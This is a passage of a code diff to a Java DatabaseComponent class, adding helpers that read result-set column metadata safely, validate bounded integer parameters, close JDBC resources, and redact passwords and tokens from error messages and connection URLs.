+    private String safeColumnName(ResultSetMetaData metadata, int index) {
+        try {
+            String name = metadata.getColumnName(index);
+            return isBlank(name) ? "column" + index : name;
+        } catch (Throwable ignored) {
+            return "column" + index;
+        }
+    }
+
+    private String safeColumnTypeName(ResultSetMetaData metadata, int index) {
+        try {
+            String type = metadata.getColumnTypeName(index);
+            return isBlank(type) ? "UNKNOWN" : type;
+        } catch (Throwable ignored) {
+            return "UNKNOWN";
+        }
+    }
+
+    private Object safeColumnType(ResultSetMetaData metadata, int index) {
+        try { return Integer.valueOf(metadata.getColumnType(index)); }
+        catch (Throwable ignored) { return null; }
+    }
+
+    private Object safeColumnPrecision(ResultSetMetaData metadata, int index) {
+        try { return Integer.valueOf(metadata.getPrecision(index)); }
+        catch (Throwable ignored) { return null; }
+    }
+
+    private Object safeColumnScale(ResultSetMetaData metadata, int index) {
+        try { return Integer.valueOf(metadata.getScale(index)); }
+        catch (Throwable ignored) { return null; }
+    }
+
+    private Object safeColumnNullable(ResultSetMetaData metadata, int index) {
+        try {
+            int nullable = metadata.isNullable(index);
+            if (nullable == ResultSetMetaData.columnNullableUnknown) return null;
+            return Boolean.valueOf(nullable != ResultSetMetaData.columnNoNulls);
+        } catch (Throwable ignored) {
+            return null;
+        }
+    }
+
+    private int getBoundedIntParam(String key, int defaultValue, int minimum, int maximum) {
+        Object value = params.get(key);
+        if (value == null) return defaultValue;
+        String text;
+        if (value instanceof Number) return bounded(key, ((Number) value).intValue(), minimum, maximum);
+        if (value instanceof byte[]) text = decode((byte[]) value);
+        else text = String.valueOf(value);
+        try {
+            return bounded(key, Integer.parseInt(text.trim()), minimum, maximum);
+        } catch (NumberFormatException error) {
+            throw new IllegalArgumentException(key + " 必须是整数");
+        }
+    }
+
+    private int bounded(String key, int value, int minimum, int maximum) {
+        if (value < minimum || value > maximum) {
+            throw new IllegalArgumentException(key + " 必须在 " + minimum + " 到 " + maximum + " 之间");
+        }
+        return value;
+    }
+
+    private void closeResource(Object resource) {
+        if (resource == null) return;
+        try {
+            if (resource instanceof ResultSet) ((ResultSet) resource).close();
+            else if (resource instanceof Statement) ((Statement) resource).close();
+            else if (resource instanceof Connection) ((Connection) resource).close();
+        } catch (Throwable ignored) {
+        }
+    }
+
+    private String redact(String message, String password, String url) {
+        String value = message == null ? "" : message;
+        if (!isBlank(password)) value = value.replace(password, "***");
+        if (!isBlank(url)) value = value.replace(url, redactUrl(url));
+        return value;
+    }
+
+    private String redactUrl(String url) {
+        if (url == null) return null;
+        String redacted = url;
+        int scheme = url.indexOf("://");
+        int at = scheme < 0 ? -1 : url.indexOf('@', scheme + 3);
+        if (at > scheme) {
+            int colon = url.indexOf(':', scheme + 3);
+            if (colon > scheme && colon < at) {
+                redacted = url.substring(0, colon + 1) + "***" + url.substring(at);
+            }
+        }
+        return redacted.replaceAll("(?i)(password|passwd|pwd|token|secret)=([^&;]+)", "$1=***");
+    }
+
+    private String safeMessage(Throwable error) {
+        if (error == null) return "未知错误";
+        return error.getMessage() == null ? error.getClass().getName() : error.getMessage();
+    }
+
+    private boolean isBlank(String value) {
+        return value == null || value.trim().length() == 0;
+    }
+
+    private int utf8Length(String value) {
+        if (value == null) return 0;
+        try { return value.getBytes("UTF-8").length; }
+        catch (UnsupportedEncodingException ignored) { return value.getBytes().length; }
+    }
+
     private static HashMap<String, Object> copyStringObjectMap(Object value) {
         HashMap<String, Object> copy = new HashMap<String, Object>();
-        if (!(value instanceof java.util.Map)) {
-            return copy;
-        }
-        java.util.Map<?, ?> source = (java.util.Map<?, ?>) value;
-        for (java.util.Map.Entry<?, ?> entry : source.entrySet()) {
-            if (entry.getKey() instanceof String) {
-                copy.put((String) entry.getKey(), entry.getValue());
-            }
+        if (!(value instanceof Map)) return copy;
+        Map source = (Map) value;
+        Iterator iterator = source.entrySet().iterator();
+        while (iterator.hasNext()) {
+            Map.Entry entry = (Map.Entry) iterator.next();
+            if (entry.getKey() instanceof String) copy.put((String) entry.getKey(), entry.getValue());
         }
         return copy;
     }
@@ -276,10 +795,12 @@ public class DatabaseComponent implements Runnable {
     private String getStringParam(String key) {
         Object value = params.get(key);
         if (value == null) return null;
-        if (value instanceof byte[]) {
-            try { return new String((byte[]) value, "UTF-8"); }
-            catch (UnsupportedEncodingException ignored) { return new String((byte[]) value); }
-        }
+        if (value instanceof byte[]) return decode((byte[]) value);
         return String.valueOf(value);
+    }
+
+    private String decode(byte[] value) {
+        try { return new String(value, "UTF-8"); }
+        catch (UnsupportedEncodingException ignored) { return new String(value); }
     }
 }
